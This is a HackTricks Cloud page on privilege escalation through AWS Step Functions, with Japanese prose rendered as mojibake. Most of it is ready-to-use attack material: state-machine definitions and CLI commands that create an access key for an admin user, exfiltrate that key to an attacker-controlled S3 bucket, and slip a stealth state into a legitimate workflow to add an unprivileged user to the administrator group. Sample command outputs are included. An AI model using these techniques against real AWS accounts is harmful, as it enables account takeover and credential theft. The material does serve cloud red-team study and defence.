# AWS - Step Functions Privesc

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€** [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã™ã‚‹ã€‚

</details>

## Step Functions

ã“ã®AWSã‚µãƒ¼ãƒ“ã‚¹ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯ã€ä»¥ä¸‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

**`states:TestState`** ãŠã‚ˆã³ **`iam:PassRole`** æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€æ—¢å­˜ã®ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã‚’ä½œæˆã¾ãŸã¯æ›´æ–°ã›ãšã«ã€ä»»æ„ã®ã‚¹ãƒ†ãƒ¼ãƒˆã‚’ãƒ†ã‚¹ãƒˆã—ã€ä»»æ„ã®IAMãƒ­ãƒ¼ãƒ«ã‚’ãã‚Œã«æ¸¡ã™ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã‚’ä½¿ç”¨ã—ã¦ä»–ã®AWSã‚µãƒ¼ãƒ“ã‚¹ã«æœªæ‰¿èªã§ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®æ¨©é™ã‚’çµ„ã¿åˆã‚ã›ã‚‹ã¨ã€ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã®æ“ä½œã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã®å¤‰æ›´ã€ãƒ‡ãƒ¼ã‚¿æ¼æ´©ã€ãƒªã‚½ãƒ¼ã‚¹æ“ä½œã€ç‰¹æ¨©æ˜‡æ ¼ã¾ã§ã€å¹…åºƒã„æœªæ‰¿èªã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
ä»¥ä¸‹ã®ä¾‹ã¯ã€ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æ´»ç”¨ã—ã¦**`admin`**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼ã‚’ä½œæˆã™ã‚‹ã‚¹ãƒ†ãƒ¼ãƒˆã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã“ã®è¨±å¯ã•ã‚ŒãŸãƒ­ãƒ¼ãƒ«ã¯ã€é«˜ã„ç‰¹æ¨©ã‚’æŒã¤ãƒãƒªã‚·ãƒ¼ï¼ˆä¾‹: **`arn:aws:iam::aws:policy/AdministratorAccess`**ï¼‰ãŒé–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚¹ãƒ†ãƒ¼ãƒˆãŒ**`iam:CreateAccessKey`**ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **ç‰¹æ¨©æ˜‡æ ¼ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«å®Ÿè¡Œã•ã‚ŒãŸ**ã‚³ãƒãƒ³ãƒ‰:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **æ½œåœ¨çš„å½±éŸ¿**: ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã®ä¸æ­£ãªå®Ÿè¡Œã¨æ“ä½œã€ãŠã‚ˆã³æ©Ÿå¯†ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ã¨ãªã‚Šã€é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¾µå®³ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

**`states:CreateStateMachine`**ã¨**`iam:PassRole`**ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã‚’ä½œæˆã—ã€ä»»æ„ã®IAMãƒ­ãƒ¼ãƒ«ã‚’æä¾›ã™ã‚‹ã“ã¨ãŒã§ãã€ãã®ãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã§ä»–ã®AWSã‚µãƒ¼ãƒ“ã‚¹ã«ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚ä»¥å‰ã®æ¨©é™æ˜‡æ ¼ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯(**`states:TestState`** & **`iam:PassRole`**)ã¨ã¯ç•°ãªã‚Šã€ã“ã®æ–¹æ³•ã¯è‡ªå·±å®Ÿè¡Œã—ã¾ã›ã‚“ã€‚**`states:StartExecution`**ã¾ãŸã¯**`states:StartSyncExecution`**æ¨©é™(**`states:StartSyncExecution`**ã¯**æ¨™æº–ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã§ã¯åˆ©ç”¨ã§ããšã€å˜ã«ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã‚’è¡¨ç¾ã™ã‚‹ãŸã‚**)ã‚‚å¿…è¦ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ä¸Šã§å®Ÿè¡Œã‚’é–‹å§‹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
ä»¥ä¸‹ã®ä¾‹ã¯ã€`admin`ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãŸã‚ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼ã‚’ä½œæˆã—ã€ã“ã‚Œã‚’æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹S3ãƒã‚±ãƒƒãƒˆã«å¤–éƒ¨æµå‡ºã•ã›ã‚‹ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã‚’ä½œæˆã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€ã“ã‚Œã‚‰ã®æ¨©é™ã¨AWSç’°å¢ƒã®è¨±å¯ãƒ­ãƒ¼ãƒ«ã‚’æ´»ç”¨ã—ã¾ã™ã€‚ã“ã®è¨±å¯ãƒ­ãƒ¼ãƒ«ã«ã¯ã€ãã‚Œã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸé«˜ç‰¹æ¨©ãƒãƒªã‚·ãƒ¼ï¼ˆãŸã¨ãˆã°`arn:aws:iam::aws:policy/AdministratorAccess`ï¼‰ãŒã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ãŒ`iam:CreateAccessKey`ãŠã‚ˆã³`s3:putObject`ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã‚’ä½œæˆã™ã‚‹ãŸã‚ã«å®Ÿè¡Œã•ã‚Œã‚‹**ã‚³ãƒãƒ³ãƒ‰**ï¼š**
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- ä»¥å‰ã«ä½œæˆã—ãŸã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã®å®Ÿè¡Œã‚’é–‹å§‹ã™ã‚‹ãŸã‚ã«å®Ÿè¡Œã•ã‚Œã‚‹**ã‚³ãƒãƒ³ãƒ‰**ï¼š
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹S3ãƒã‚±ãƒƒãƒˆã¯ã€è¢«å®³è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰ã®s3:PutObjectã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å—ã‘å…¥ã‚Œã‚‹æ¨©é™ã‚’æŒã¤å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

{% endhint %}

- **æ½œåœ¨çš„ãªå½±éŸ¿**: ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã®å®Ÿè¡Œã¨æ“ä½œã€æ©Ÿå¯†ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒä¸æ­£ã«è¡Œã‚ã‚Œã€é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¾µå®³ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### `states:UpdateStateMachine` & (å¿…ãšã—ã‚‚å¿…è¦ã§ã¯ãªã„) `iam:PassRole`

**`states:UpdateStateMachine`** æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã®å®šç¾©ã‚’å¤‰æ›´ã—ã€ç‰¹åˆ¥ãªã‚¹ãƒ†ãƒ«ã‚¹çŠ¶æ…‹ã‚’è¿½åŠ ã—ã¦ç‰¹æ¨©æ˜‡æ ¼ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€åˆæ³•çš„ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã®å®Ÿè¡Œã‚’é–‹å§‹ã™ã‚‹ã¨ã€ã“ã®æ–°ã—ã„æ‚ªæ„ã®ã‚ã‚‹ã‚¹ãƒ†ãƒ«ã‚¹çŠ¶æ…‹ãŒå®Ÿè¡Œã•ã‚Œã€ç‰¹æ¨©æ˜‡æ ¼ãŒæˆåŠŸã—ã¾ã™ã€‚

ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸIAMãƒ­ãƒ¼ãƒ«ãŒã©ã‚Œã ã‘è¨±å¯çš„ã‹ã«ã‚ˆã£ã¦ã€æ”»æ’ƒè€…ã¯2ã¤ã®çŠ¶æ³ã«ç›´é¢ã—ã¾ã™:

1. **è¨±å¯çš„ãªIAMãƒ­ãƒ¼ãƒ«**: ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸIAMãƒ­ãƒ¼ãƒ«ãŒæ—¢ã«è¨±å¯çš„ã§ã‚ã‚‹å ´åˆï¼ˆãŸã¨ãˆã°ã€**`arn:aws:iam::aws:policy/AdministratorAccess`** ãƒãƒªã‚·ãƒ¼ãŒæ·»ä»˜ã•ã‚Œã¦ã„ã‚‹å ´åˆï¼‰ã€ç‰¹æ¨©æ˜‡æ ¼ã™ã‚‹ãŸã‚ã« **`iam:PassRole`** æ¨©é™ãŒå¿…è¦ã§ã¯ãªã„ãŸã‚ã€IAMãƒ­ãƒ¼ãƒ«ã‚‚æ›´æ–°ã™ã‚‹å¿…è¦ãŒãªã„ãŸã‚ã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã®å®šç¾©ã ã‘ã§ç‰¹æ¨©æ˜‡æ ¼ãŒå¯èƒ½ã§ã™ã€‚
2. **è¨±å¯ã•ã‚Œã¦ã„ãªã„IAMãƒ­ãƒ¼ãƒ«**: å‰è¿°ã®ã‚±ãƒ¼ã‚¹ã¨ã¯å¯¾ç…§çš„ã«ã€ã“ã“ã§ã¯ã€æ”»æ’ƒè€…ã¯ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã«è¨±å¯ã®ã‚ã‚‹IAMãƒ­ãƒ¼ãƒ«ã‚’é–¢é€£ä»˜ã‘ã‚‹å¿…è¦ãŒã‚ã‚‹ãŸã‚ã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã®å®šç¾©ã‚’å¤‰æ›´ã™ã‚‹ã ã‘ã§ãªãã€ **`iam:PassRole`** æ¨©é™ã‚‚å¿…è¦ã¨ãªã‚Šã¾ã™ã€‚
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
ä»¥ä¸‹ã®ä¾‹ã§ã¯ã€HelloWorld Lambdaé–¢æ•°ã‚’å‘¼ã³å‡ºã™ã ã‘ã®æ­£å½“ãªã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã‚’æ›´æ–°ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼**`unprivilegedUser`**ã‚’**`administrator`** IAMã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã™ã‚‹è¿½åŠ ã‚¹ãƒ†ãƒ¼ãƒˆã‚’è¿½åŠ ã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ­£å½“ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæ›´æ–°ã•ã‚ŒãŸã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã®å®Ÿè¡Œã‚’é–‹å§‹ã™ã‚‹ã¨ã€ã“ã®æ–°ã—ã„æ‚ªæ„ã®ã‚ã‚‹ã‚¹ãƒ†ãƒ«ã‚¹ã‚¹ãƒ†ãƒ¼ãƒˆãŒå®Ÿè¡Œã•ã‚Œã€ç‰¹æ¨©æ˜‡æ ¼ãŒæˆåŠŸã—ã¾ã™ã€‚

{% hint style="warning" %}

ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã«è¨±å¯ã®ã‚ã‚‹IAMãƒ­ãƒ¼ãƒ«ãŒé–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ãªã„å ´åˆã€IAMãƒ­ãƒ¼ãƒ«ã‚’æ›´æ–°ã—ã¦è¨±å¯ã®ã‚ã‚‹IAMãƒ­ãƒ¼ãƒ«ã‚’é–¢é€£ä»˜ã‘ã‚‹ãŸã‚ã«ã¯ã€**`iam:PassRole`**æ¨©é™ã‚‚å¿…è¦ã§ã™ï¼ˆãŸã¨ãˆã°ã€**`arn:aws:iam::aws:policy/AdministratorAccess`**ãƒãƒªã‚·ãƒ¼ãŒæ·»ä»˜ã•ã‚ŒãŸIAMãƒ­ãƒ¼ãƒ«ï¼‰ã€‚

{% endhint %}

{% tabs %}

{% tab title="æ­£å½“ãªã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="æ‚ªæ„ã®ã‚ã‚‹æ›´æ–°ã•ã‚ŒãŸã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
- **æ­£å½“ãªã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã‚’æ›´æ–°ã™ã‚‹**ãŸã‚ã«å®Ÿè¡Œã•ã‚ŒãŸ**ã‚³ãƒãƒ³ãƒ‰**ï¼š
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **æ½œåœ¨çš„å½±éŸ¿**: ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã®æœªæ‰¿èªã®å®Ÿè¡Œã¨æ“ä½œã€ãŠã‚ˆã³æ©Ÿå¯†ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ã¨ãªã‚Šã€é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¾µå®³ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€** [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
